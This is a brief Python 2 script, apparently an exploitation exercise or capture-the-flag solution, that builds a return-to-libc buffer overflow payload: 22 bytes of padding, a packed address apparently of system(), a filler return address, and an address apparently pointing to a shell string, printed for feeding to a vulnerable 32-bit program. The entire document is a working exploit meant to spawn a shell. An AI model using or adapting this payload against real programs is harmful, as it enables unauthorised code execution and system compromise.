from struct import pack

buf = '0'*22
sysaddr = pack("<I", 0x0804a030)
shelladdr = pack("<I", 0x080c61e5)

print buf+sysaddr+'0'*4+shelladdr
